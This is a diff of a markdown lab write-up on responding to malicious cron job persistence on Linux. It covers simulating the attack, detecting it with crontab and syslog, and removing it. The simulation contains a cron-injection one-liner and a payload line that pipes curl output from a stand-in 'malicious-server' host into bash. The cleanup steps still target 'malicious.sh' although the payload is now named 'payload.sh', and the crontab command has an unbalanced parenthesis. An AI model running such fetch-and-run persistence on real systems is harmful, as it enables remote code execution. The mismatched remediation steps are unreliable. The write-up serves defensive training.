@@ -1,26 +1,23 @@
-# 🛡️ Day 13 – Detecting and Removing Malicious Cron Jobs - Linux 
+# 🛡️ Day 13 – Incident Response: Malicious Cron Job Persistence (Linux) 
 
 ## 📌 Objective
-Investigate and respond to a malicious cron job used by an attacker to maintain persistence on a Linux system. And simulate the attack, detect the malicious scheduled task, analyze the script, and remove the threat — applying the full incident response lifecycle.
+Understand how attackers use cron jobs to maintain persistence on compromised Linux systems. This lab demonstrates how to simulate, detect, and remove a malicious cron job pointing to a bash script stored in the `/tmp` directory.
+
+---
+
+## 🗂️ Table of Contents
+
+- [Lab Setup](#lab-setup)
+- [Simulating the Attack](#simulating-the-attack)
+- [Investigation Steps](#investigation-steps)
+- [Screenshot](#-screenshot--cron-investigation)
+- [Key Learnings](#key-learnings)
+- [Conclusion](#conclusion)
 
 ---
 
 ## 📘 What is a Cron Job?
 A cron job is a scheduled task that runs automatically at defined intervals on Unix/Linux systems. Attackers often use cron to re-execute payloads, reconnect to command-and-control servers, or maintain access to a compromised system.
-
-### 🛠️Key Features:
-Run commands automatically (e.g., every minute, daily, weekly)
-Useful for backups, updates, monitoring scripts, etc.
-Works in the background via the cron service
-🧾Format of a crontab entry:
-*  *  *  *  *  command-to-run
-│  │  │  │  │
-│  │  │  │  └─ Day of the week (0-7, Sun = 0 or 7)
-│  │  │  └──── Month (1 - 12)
-│  │  └─────── Day of month (1 - 31)
-│  └────────── Hour (0 - 23)
-└───────────── Minute (0 - 59)
-
 
 ## 🔄 Incident Response Lifecycle (NIST)
 
@@ -32,25 +29,45 @@ Works in the background via the cron service
 | Post-Incident Activity | Document the incident, and set alerts for future cron job changes. |
 
 
-## 🛠️ ⚠️ Scenario: A Malicious Cron Job is Running Every Minute
-An attacker has added a cron job that silently runs a malicious script from /tmp every minute. Your job is to detect it, understand its behavior, and remove it safely.
+### 🛠️Key Features:
+Run commands automatically (e.g., every minute, daily, weekly)
+Useful for backups, updates, monitoring scripts, etc.
+Works in the background via the cron service
+
+
+🧾 Format of a crontab Entry
+
+*  *  *  *  *  command-to-run
+│  │  │  │  │
+│  │  │  │  └─── Day of the Week (0 - 7) (Sunday = 0 or 7)
+│  │  │  └────── Month (1 - 12)
+│  │  └───────── Day of Month (1 - 31)
+│  └──────────── Hour (0 - 23)
+└──────────────── Minute (0 - 59)
+
 
 ## 🛠️ Lab Setup
 
-## System Requirements:
-- Ubuntu 20.04 Kali Linux
-- Terminal with sudo access
+- **Target System**: Ubuntu Linux (Kali or Ubuntu VM)
+- **Tools Used**: `crontab`, `find`, `grep`, `ps`, `rm`
+- **Scenario**: A malicious script is dropped in `/tmp` and scheduled to execute every minute via cron.
 
-### Simulate the Incident:
-1. Create a fake "malicious" script:
-```
-echo -e '#!/bin/bash\necho "Ping from attacker server" >> /tmp/.cron.log' > /tmp/malicious.sh
-chmod +x /tmp/malicious.sh
+---
+
+## 🛠️ ⚠️ Scenario: A Malicious Cron Job is Running Every Minute
+An attacker has added a cron job that silently runs a malicious script from /tmp every minute. Your job is to detect it, understand its behavior, and remove it safely.
+
+
+### Simulating the Attack:
+1. Attacker add a schedule cron job:
+```bash
+(crontab -l 2>/dev/null; echo "* * * * * /tmp/payload.sh" | crontab - 
 ```
 
-2. Add a cron job for the current user:
-```
-echo "* * * * * /tmp/malicious.sh" >> /var/spool/cron/root
+2. Create Payload script
+```bash
+#!/bin/bash
+curl http://malicious-server/payload.sh | bash
 ```
 
 ### 📸 Screenshot
@@ -62,33 +79,36 @@ echo "* * * * * /tmp/malicious.sh" >> /var/spool/cron/root
 
 ## 🧪 Step-by-Step Investigation
 
-### Step 1. Preparation
+### Step 1. Detect Suspicious Cron Jobs
 - Make sure cron is installed and running:
-```
-sudo systemctl status cron 
-``` 
-- Enable logging (cron logs are usually in /var/log/syslog or /var/log/cron).
-
-
-### Step 2. Detection and Analysis
-- Check for suspicious cron entries:
-```
+```bash 
 crontab -l
-```
+grep CRON /var/log/syslog
+``` 
+📖 Reference
+🧾 Format of a crontab Entry
+*  *  *  *  *  command-to-run
+│  │  │  │  │
+│  │  │  │  └─── Day of the Week (0 - 7) (Sunday = 0 or 7)
+│  │  │  └────── Month (1 - 12)
+│  │  └───────── Day of Month (1 - 31)
+│  └──────────── Hour (0 - 23)
+└──────────────── Minute (0 - 59)
+
 
 - Search cron directories for unauthorized jobs:
-```
+```bash
 grep -r "/tmp/" /etc/cron* /var/spool/cron/crontabs
 ```
 
 - Review logs to confirm execution:
-```
+```bash
 cat /tmp/.cron.log
 ```
 
-- Analyze the script:
+- Analyze the Malicious script:
 ```
-cat /tmp/malicious.sh
+cat /tmp/payload.sh
 ```
 
 ### 📸 Screenshot
@@ -97,18 +117,19 @@ cat /tmp/malicious.sh
 </p> <p align="center"><em>Detection and Analysis</em></p>
 
 
-### Step 3. Containment, Eradication, and Recovery
-- Remove the malicious cron job:
-``` crontab -l | grep -v "malicious.sh" | crontab -
+### Step 2. Containment, Eradication, and Recovery
+- Remove the malicious cron entry:
+```
+crontab -l | grep -v "malicious.sh" | crontab -
 ```
 
- - Delete the script and its output:
- ```
+ - Delete the malicious script and its output:
+ ```bash
 rm -f /tmp/malicious.sh /tmp/.cron.log
 ```
 
 - Restart the cron service: 
-```
+```bash
 sudo systemctl restart cron
 ```
 
@@ -117,7 +138,6 @@ sudo systemctl restart cron
 - When the cron job was added
 - What the script was doing
 - Any signs of lateral movement or download activity
-
 - Recommendations:
 - Restrict cron job access to authorized users only
 - Enable cron integrity checks
@@ -126,22 +146,18 @@ sudo systemctl restart cron
 ### 📸 Screenshot
 <p align="center">
   <img src="../../Screenshots/Day-13-Incident-Response_Containment-Eradication-Recovery.png" width="400">
-</p> <p align="center"><em>Hydra brute-force attack against RDP</em></p>
+</p> <p align="center"><em>Containment & Eradication</em></p>
 
 ---
 
 ## 🧠 Key Learnings
-- ✅ Simulate Cron Job Create a malicious script and schedule it via cron 
-- ✅ Investigate Detect the cron job and examine the script behavior 
-- ✅ Respond Remove the script and the cron entry 
-- ✅ Document Record all findings and suggest prevention steps
+- ✅  Simulated attacker persistence via cron job
+- ✅ Identified malicious jobs using crontab -l and log analysis
+- ✅ Analyzed and removed bash script in /tmp
+- ✅ Reviewed /var/log/syslog for cron execution history
+- ✅ Practiced post-incident cleanup to restore system integrity
 
 ---
 
 ## 🎯 Conclusion
-- Learned to use the incident response process to respond to a suspicious malicious script on a linux machine.
-- Monitor cron directories /var/spool/cron/crontab /etc/cron*
-- Monitor logs /var/log/syslogs for executed cron jobs
-- Contained, Eradicate the incident by deleting the cron entries and the malicious script.
-
----
+- Malicious cron jobs are a common attacker persistence technique in Linux systems. In this lab, I learned to identify suspicious scheduled tasks, investigate associated payloads, and apply basic remediation using standard Linux tools.
